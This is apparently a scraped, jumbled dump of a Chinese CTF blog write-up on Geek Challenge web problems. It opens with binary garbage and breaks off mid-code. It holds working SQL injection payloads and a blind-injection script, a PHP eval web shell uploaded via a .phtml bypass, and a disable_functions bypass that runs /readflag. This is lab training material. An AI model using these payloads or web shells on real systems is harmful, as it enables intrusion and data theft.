1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002&#x2F;bin&#x2F;cat &#x2F;flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����&#96;\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$&quot;\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007&#96;\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e&#96;\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002&quot;�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006&#96;\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b&lt;\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d&#x2F;\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001&quot;</span><br></pre></td></tr></table></figure>\n\n<p>是linux可执文件</p>\n<p>连接蚁剑 payload :</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;cmd&#39;])</span><br></pre></td></tr></table></figure>\n\n<p>应该是要绕过disable_function,从而执行readflag，项目地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD</span><br></pre></td></tr></table></figure>\n\n<p>只有/tmp有文件修改权限，上传<code>bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so</code>到/tmp下</p>\n<p>最后payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;include &quot;&#x2F;tmp&#x2F;bypass_disablefunc.php&quot;&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>\n\n<p>输出为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> example: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br><span class=\"line\"></span><br><span class=\"line\">cmdline: &#x2F;readflag &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">output:</span><br><span class=\"line\">flag&#123;6e16639a-9eca-45b8-a972-e61da4146393&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"极客大挑战web\"><a href=\"#极客大挑战web\" class=\"headerlink\" title=\"极客大挑战web\"></a>极客大挑战web</h2><h3 id=\"LoveSQL\"><a href=\"#LoveSQL\" class=\"headerlink\" title=\"LoveSQL\"></a>LoveSQL</h3><p>fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误</p>\n<p>常规操作</p>","more":"<ol>\n<li><h4 id=\"order-by判断字段，字段为3\"><a href=\"#order-by判断字段，字段为3\" class=\"headerlink\" title=\"order by判断字段，字段为3\"></a>order by判断字段，字段为3</h4></li>\n</ol>\n<p><img src=\"/pic/38.png\" alt=\"\"></p>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code></p>\n<p><img src=\"/pic/39.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li><h4 id=\"union确定回显，回显位置为2，3\"><a href=\"#union确定回显，回显位置为2，3\" class=\"headerlink\" title=\"union确定回显，回显位置为2，3\"></a>union确定回显，回显位置为2，3</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,2,3+%23&amp;password=123</code></p>\n<p><img src=\"/pic/40.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li><h4 id=\"查数据库\"><a href=\"#查数据库\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,database(),3+%23&amp;password=123</code></p>\n<p><img src=\"/pic/41.png\" alt=\"\"></p>\n<ol start=\"4\">\n<li><h4 id=\"查表\"><a href=\"#查表\" class=\"headerlink\" title=\"查表\"></a>查表</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/42.png\" alt=\"\"></p>\n<p>l0ve1ysq1、geekuser</p>\n<ol start=\"5\">\n<li><h4 id=\"查列名\"><a href=\"#查列名\" class=\"headerlink\" title=\"查列名\"></a>查列名</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;l0ve1ysq1&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/43.png\" alt=\"\"></p>\n<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;geekuser&#39;+%23&amp;password=123</code></p>\n<p><img src=\"/pic/44.png\" alt=\"\"></p>\n<ol start=\"6\">\n<li><h4 id=\"查数据\"><a href=\"#查数据\" class=\"headerlink\" title=\"查数据\"></a>查数据</h4></li>\n</ol>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+geekuser+limit+0,1+%23&amp;password=123</code></p>\n<p>geekuser只有一个admin</p>\n<p><img src=\"/pic/45.png\" alt=\"\"></p>\n<p>l0ve1ysq1表中发现了flag</p>\n<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code> </p>\n<p><img src=\"/pic/46.png\" alt=\"\"></p>\n<h3 id=\"BabySQL\"><a href=\"#BabySQL\" class=\"headerlink\" title=\"BabySQL\"></a>BabySQL</h3><p>fuzzing一下，将union,select,and,or,where,from删除</p>\n<p>此时可以selselectect将select删除之后就变成了sel <del>select</del> ect</p>\n<p>因为和上面的一样，直接查询数据库</p>\n<ol>\n<li><h4 id=\"查数据库-1\"><a href=\"#查数据库-1\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,database(),3--+&amp;password=123</code></p>\n<p>数据库名还是geek</p>\n<ol start=\"2\">\n<li><h4 id=\"查询表\"><a href=\"#查询表\" class=\"headerlink\" title=\"查询表\"></a>查询表</h4></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username&#x3D;&#39;uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema&#x3D;&#39;geek&#39;--+&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>\n\n<p>b4bsql,geekuser</p>\n<ol start=\"3\">\n<li><h4 id=\"查列名-1\"><a href=\"#查列名-1\" class=\"headerlink\" title=\"查列名\"></a>查列名</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema=&#39;geek&#39;+anandd+table_name=&#39;b4bsql&#39;--+&amp;password=123</code></p>\n<p>列名还是id,username,password</p>\n<ol start=\"4\">\n<li><h4 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h4></li>\n</ol>\n<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&amp;password=123</code></p>\n<p><img src=\"/pic/47.png\" alt=\"\"></p>\n<p>成功拿到flag</p>\n<h3 id=\"Http\"><a href=\"#Http\" class=\"headerlink\" title=\"Http\"></a>Http</h3><p>打开BP，开启拦截，查看site map发现有一个secret.php</p>\n<p><img src=\"/pic/48.png\" alt=\"\"></p>\n<p>访问即可</p>\n<p>根据提示修改http头</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/Secret.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: node3.buuoj.cn:27400</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: */*</span><br><span class=\"line\"><span class=\"attribute\">X-Forwarded-for:127.0.0.1</span></span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en</span><br><span class=\"line\"><span class=\"attribute\">Referer:https://www.Sycsecret.com</span></span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"BuyFlag\"><a href=\"#BuyFlag\" class=\"headerlink\" title=\"BuyFlag\"></a>BuyFlag</h3><p>点进去有一个payflag界面,</p>\n<p>根据提示，</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">If you want to buy the FLAG:</span><br><span class=\"line\">You must be a student from CUIT!!!</span><br><span class=\"line\">You must be answer the correct password!!! </span><br><span class=\"line\"></span><br><span class=\"line\">Only Cuit's students can buy the FLAG</span><br></pre></td></tr></table></figure>\n\n<p>页面最后有一段注释</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">\t~~~post money and password~~~</span></span><br><span class=\"line\"><span class=\"comment\">if (isset($_POST['password'])) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t$password = $_POST['password'];</span></span><br><span class=\"line\"><span class=\"comment\">\tif (is_numeric($password)) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\techo \"password can't be number&lt;/br&gt;\";</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;elseif ($password == 404) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\techo \"Password Right!&lt;/br&gt;\";</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这一段注释是对输入的<code>password</code>作比较，输入的是404，且能绕过<code>is_numeric()</code>函数。</p>\n<p>在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的</p>\n<p><img src=\"/pic/49.png\" alt=\"\"></p>\n<p>抓包发现有cookie, user=0，改成=1，变成了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">you are Cuiter</span><br><span class=\"line\">Please input your password!!</span><br></pre></td></tr></table></figure>\n\n<p>传入数据<code>password=404a&amp;money=999999999</code>，他说数据太长，只能传入八位。</p>\n<p>之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过</p>\n<p><code>password=404a&amp;money[]=</code></p>\n<h3 id=\"Upload\"><a href=\"#Upload\" class=\"headerlink\" title=\"Upload\"></a>Upload</h3><p>上传PHP一句话被过滤</p>\n<p><img src=\"/pic/50.png\" alt=\"\"></p>\n<p>换成图片后缀jpg进行%00截断，还是被过滤</p>\n<p><img src=\"/pic/51.png\" alt=\"\"></p>\n<p>尝试php2,php3,php5都被过滤</p>\n<p><img src=\"/pic/52.png\" alt=\"\"></p>\n<p><img src=\"/pic/53.png\" alt=\"\"></p>\n<p><img src=\"/pic/54.png\" alt=\"\"></p>\n<p>只有phtml没有被过滤</p>\n<p><img src=\"/pic/55.png\" alt=\"\"></p>\n<p>内容不能出现<code>&lt;?</code>可以换成js的写法</p>\n<p><img src=\"/pic/56.png\" alt=\"\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=<span class=\"string\">\"php\"</span>&gt;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>($_POST[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再上传提示必须是图片，添加gif文件头<code>GIF89a</code></p>\n<p><img src=\"/pic/57.png\" alt=\"\"></p>\n<p>使用蚁剑，菜刀连接，找到flag</p>\n<p><img src=\"/pic/58.png\" alt=\"\"></p>\n<h3 id=\"HardSQL\"><a href=\"#HardSQL\" class=\"headerlink\" title=\"HardSQL\"></a>HardSQL</h3><p>fuzz测试</p>\n<p><code>AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&amp;&amp;,&lt;,&gt;,ascii,%20,%09</code>被过滤</p>\n<p>输入错误还会报出sql语句错误，考虑报错注入</p>\n<ol>\n<li><h4 id=\"查数据库-2\"><a href=\"#查数据库-2\" class=\"headerlink\" title=\"查数据库\"></a>查数据库</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(database())),0))%23</code>还是geek</p>\n</li>\n<li><h4 id=\"查表-1\"><a href=\"#查表-1\" class=\"headerlink\" title=\"查表\"></a>查表</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0))%23</code></p>\n<p>H4rDsq1</p>\n</li>\n<li><h4 id=\"查列名（应该还是只有id-usname-password）\"><a href=\"#查列名（应该还是只有id-usname-password）\" class=\"headerlink\" title=\"查列名（应该还是只有id,usname,password）\"></a>查列名（应该还是只有id,usname,password）</h4></li>\n<li><h4 id=\"查数据-1\"><a href=\"#查数据-1\" class=\"headerlink\" title=\"查数据\"></a>查数据</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>\n<p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>\n<p>因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。</p>\n</li>\n</ol>\n<h3 id=\"FinalSQL\"><a href=\"#FinalSQL\" class=\"headerlink\" title=\"FinalSQL\"></a>FinalSQL</h3><p>fuzz之后发现被过滤的关键字有</p>\n<p><img src=\"/pic/59.png\" alt=\"\"></p>\n<p>题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框</p>\n<p><img src=\"/pic/60.png\" alt=\"\"></p>\n<p><img src=\"/pic/61.png\" alt=\"\"></p>\n<p>根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注</p>\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'others'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tabls('geek') #F1naI1y,Flaaaaag</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># get_columns('F1naI1y') # id,username,password</span></span><br><span class=\"line\"><span class=\"comment\"># get_columns('Flaaaaag') # id,fl4gawsl</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_data('fl4gawsl','Flaaaaag')</span></span><br><span class=\"line\">get_data(<span class=\"string\">'id,username,password'</span>,<span class=\"string\">'F1naI1y'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>跑出来有两个表F1naI1y,Flaaaaag</p>\n<p>F1naI1y表还是只有id,username,password</p>\n<p>Flaaaaag表包括id,fl4gawsl</p>\n<h3 id=\"RCE-ME\"><a href=\"#RCE-ME\" class=\"headerlink\" title=\"RCE ME\"></a>RCE ME</h3><p>打开题目有源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span 